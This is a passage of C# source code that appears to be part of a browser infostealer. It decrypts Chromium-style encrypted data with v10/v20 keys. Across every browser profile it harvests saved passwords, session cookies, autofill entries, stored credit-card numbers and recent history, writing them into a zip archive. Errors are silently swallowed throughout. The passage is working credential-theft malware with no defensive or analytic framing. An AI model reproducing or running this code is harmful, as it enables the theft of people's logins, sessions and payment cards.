                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                authInfo.cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
                authInfo.pbNonce = pbNonce;
                authInfo.cbNonce = (uint)nonce.Length;
                authInfo.pbTag = pbTag;
                authInfo.cbTag = (uint)tag.Length;

                byte[] output = new byte[ciphertext.Length];
                uint pcbResult = 0;

                if (BCryptDecrypt(hKey, ciphertext, (uint)ciphertext.Length, ref authInfo, null, 0, output, (uint)output.Length, out pcbResult, 0) == 0)
                {
                    return output;
                }
            }
            catch { }
            finally
            {
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
            }
            return null;
        }

        private static void ExtractAllProfilesData(byte[] v20Key, byte[] v10Key, BrowserConfig config, string userDataDir, string zipPath)
        {
            var profiles = Directory.GetDirectories(userDataDir).Where(d => File.Exists(Path.Combine(d, "Preferences"))).Select(Path.GetFileName);
            bool isOpera = config.Name.Contains("Opera");

            foreach (var profile in profiles)
            {
                string profilePath = Path.Combine(userDataDir, profile);
                string browserName = config.OutputDir;

                ExtractPasswords(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
                ExtractCookies(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
                ExtractAutofill(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
                ExtractHistory(profilePath, zipPath, browserName, profile);
            }
        }

        private static void AddToZip(string zipPath, string entryName, string content)
        {
            try
            {
                using (var zip = ZipFile.Open(zipPath, File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
                {
                    var entry = zip.CreateEntry(entryName);
                    using (var writer = new StreamWriter(entry.Open()))
                    {
                        writer.Write(content);
                    }
                }
            }
            catch { }
        }

        private static string GetSQLiteString(IntPtr stmt, int index)
        {
            IntPtr ptr = sqlite3_column_text(stmt, index);
            if (ptr == IntPtr.Zero) return string.Empty;
            int len = sqlite3_column_bytes(stmt, index);
            byte[] buffer = new byte[len];
            Marshal.Copy(ptr, buffer, 0, len);
            return Encoding.UTF8.GetString(buffer);
        }

        private static void ExtractPasswords(string profilePath, string zipPath, byte[] v10Key, byte[] v20Key, string browser, string profile, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(dbPath)) return;

            string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            try
            {
                File.Copy(dbPath, tempDb);
                if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                {
                    string sql = "SELECT origin_url, username_value, password_value FROM logins";
                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                    {
                        StringBuilder sb = new StringBuilder();
                        while (sqlite3_step(stmt) == SQLITE_ROW)
                        {
                            string url = GetSQLiteString(stmt, 0);
                            string user = GetSQLiteString(stmt, 1);
                            int blobSize = sqlite3_column_bytes(stmt, 2);
                            IntPtr blobPtr = sqlite3_column_blob(stmt, 2);
                            byte[] blob = new byte[blobSize];
                            Marshal.Copy(blobPtr, blob, 0, blobSize);

                            byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
                            if (dec != null)
                            {
                                sb.AppendLine($"URL: {url}\nUser: {user}\nPass: {Encoding.UTF8.GetString(dec)}\n---");
                            }
                        }
                        sqlite3_finalize(stmt);
                        if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/passwords.txt", sb.ToString());
                    }
                    sqlite3_close(db);
                }
            }
            catch { }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractCookies(string profilePath, string zipPath, byte[] v10Key, byte[] v20Key, string browser, string profile, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(dbPath)) dbPath = Path.Combine(profilePath, "Cookies");
            if (!File.Exists(dbPath)) return;

            string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            try
            {
                File.Copy(dbPath, tempDb);
                if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                {
                    string sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                    {
                        StringBuilder sb = new StringBuilder();
                        while (sqlite3_step(stmt) == SQLITE_ROW)
                        {
                            string host = GetSQLiteString(stmt, 0);
                            string name = GetSQLiteString(stmt, 1);
                            string value = GetSQLiteString(stmt, 2);
                            int blobSize = sqlite3_column_bytes(stmt, 3);
                            IntPtr blobPtr = sqlite3_column_blob(stmt, 3);
                            byte[] blob = new byte[blobSize];
                            Marshal.Copy(blobPtr, blob, 0, blobSize);

                            byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
                            string cookieVal = dec != null ? Encoding.UTF8.GetString(dec) : value;

                            if (!string.IsNullOrEmpty(cookieVal))
                                sb.AppendLine($"Host: {host} | Name: {name} | Value: {cookieVal}");
                        }
                        sqlite3_finalize(stmt);
                        if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/cookies.txt", sb.ToString());
                    }
                    sqlite3_close(db);
                }
            }
            catch { }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractAutofill(string profilePath, string zipPath, byte[] v10Key, byte[] v20Key, string browser, string profile, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(dbPath)) return;

            string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            try
            {
                File.Copy(dbPath, tempDb);
                if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                {
                    StringBuilder sb = new StringBuilder();

                    // Autofill
                    IntPtr stmt;
                    if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, out stmt, IntPtr.Zero) == SQLITE_OK)
                    {
                        while (sqlite3_step(stmt) == SQLITE_ROW)
                        {
                            sb.AppendLine($"Form: {GetSQLiteString(stmt, 0)} = {GetSQLiteString(stmt, 1)}");
                        }
                        sqlite3_finalize(stmt);
                    }

                    // Credit Cards
                    if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, out stmt, IntPtr.Zero) == SQLITE_OK)
                    {
                        while (sqlite3_step(stmt) == SQLITE_ROW)
                        {
                            string name = GetSQLiteString(stmt, 0);
                            int m = sqlite3_column_int(stmt, 1);
                            int y = sqlite3_column_int(stmt, 2);
                            int blobSize = sqlite3_column_bytes(stmt, 3);
                            byte[] blob = new byte[blobSize];
                            Marshal.Copy(sqlite3_column_blob(stmt, 3), blob, 0, blobSize);

                            byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
                            if (dec != null)
                                sb.AppendLine($"Card: {name} | Exp: {m}/{y} | Num: {Encoding.UTF8.GetString(dec)}");
                        }
                        sqlite3_finalize(stmt);
                    }

                    if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/autofill.txt", sb.ToString());
                    sqlite3_close(db);
                }
            }
            catch { }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractHistory(string profilePath, string zipPath, string browser, string profile)
        {
            string dbPath = Path.Combine(profilePath, "History");
            if (!File.Exists(dbPath)) return;

            string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            try
            {
                File.Copy(dbPath, tempDb);
                if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                {
                    string sql = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100";
                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                    {
                        StringBuilder sb = new StringBuilder();
                        while (sqlite3_step(stmt) == SQLITE_ROW)
                        {
                            sb.AppendLine($"URL: {GetSQLiteString(stmt, 0)} | Title: {GetSQLiteString(stmt, 1)} | Visits: {sqlite3_column_int(stmt, 2)}");
                        }
                        sqlite3_finalize(stmt);
                        if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/history.txt", sb.ToString());
                    }
                    sqlite3_close(db);
                }
            }
            catch { }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        #endregion
    }
}
